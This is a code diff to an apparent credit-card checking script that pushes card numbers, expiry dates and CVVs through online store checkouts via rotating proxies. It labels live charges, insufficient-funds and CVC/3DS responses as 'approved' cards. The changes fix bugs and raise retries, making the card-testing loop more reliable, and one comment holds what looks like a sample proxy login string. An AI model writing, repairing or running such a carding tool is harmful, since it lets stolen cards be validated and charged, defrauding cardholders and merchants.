@@ -140,7 +140,7 @@ def parse_proxy(proxy_str):
 
 
 async def fetch_pvt_proxy():
-    url = "icey.com/proxypvt.php" ### ADD YOUR OWN PROXY API API MUST PRINT LIKE THIS -  http://cph1nf02nmd:dxwgu9a7ngyfn@216.26.2.146:3129 or http://ip:port .. direct echo no json response
+    url = "https://icey.com/proxypvt.php" ### ADD YOUR OWN PROXY API API MUST PRINT LIKE THIS -  http://cph1nf02nmd:dxwgu9a7ngyfn@216.26.2.146:3129 or http://ip:port .. direct echo no json response
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(url, timeout=10) as resp:
@@ -337,7 +337,7 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                 text = checkout_resp.text
 
                 # Fallback to direct /checkout/ if /cart didn't produce checkout
-                if "checkouts" not in checkout_url.lower() and checkout_resp.status_code != 200:
+                if "checkouts" not in checkout_url.lower() or checkout_resp.status_code != 200:
                     checkout_resp = await session.post(
                         f"{ourl}/checkout/",
                         allow_redirects=True,
@@ -808,17 +808,19 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                     print("INSUFFICIENT ✅")
                     return _result("INSUFFICIENT FUNDS !✅", approved="True")
 
+                submit_resp = {}
                 try:
                     submit_resp = json.loads(submit_text)
                     order_status = submit_resp.get('data', {}).get('submitForCompletion', {}).get('orderCreationStatus', {}).get('__typename')
                     if order_status == 'OrderCreationSucceeded':
                         print("CHARGE_SUCCESS! ✅")
                         return _result("CHARGE_SUCCESS! ✅", charged="True", approved="True")
-                except: pass
+                except Exception:
+                    pass
 
-                submit_res = submit_resp.get("data", {}).get("submitForCompletion", {})
+                submit_res = submit_resp.get("data", {}).get("submitForCompletion", {}) if isinstance(submit_resp, dict) else {}
                 if not submit_res:
-                    errs = submit_resp.get("errors", [])
+                    errs = submit_resp.get("errors", []) if isinstance(submit_resp, dict) else []
                     if errs:
                         code = errs[0].get("code", "ERROR")
                         print(f"[{attempt}] [RESULT] {code}")
@@ -893,6 +895,11 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                                     pt = p_data.get("__typename", "")
                                     print(f"    [POLL {p+1}] Type: {pt}")
                                     if pt == "ProcessedReceipt":
+                                        p_proc_err = p_data.get("processingError", {})
+                                        if p_proc_err:
+                                            p_err_code = p_proc_err.get("code") or p_proc_err.get("messageUntranslated", "DECLINED")
+                                            print(f"[{attempt}] [RESULT] {p_err_code}")
+                                            return _result(p_err_code, approved="True" if any(x in str(p_err_code).upper() for x in ["INSUFFICIENT", "CVC", "3DS"]) else "False")
                                         print("CHARGE_SUCCESS! ✅")
                                         return _result("CHARGE_SUCCESS! ✅", charged="True", approved="True")
                                     elif pt == "FailedReceipt":
@@ -968,8 +975,8 @@ def extract_clean_response(message):
     msg = str(message).strip()
     return msg
 
-async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    res = await validate_card(cc, mes, ano, cvv, site_url, variant_id=variant_id, proxy_str=proxy_str, max_retries=1)
+async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, max_retries=2):
+    res = await validate_card(cc, mes, ano, cvv, site_url, variant_id=variant_id, proxy_str=proxy_str, max_retries=max_retries)
     status_str = res.get('Response', 'ERROR')
     is_charged = res.get('Charged') == 'True'
     is_approved = res.get('Approved') == 'True'
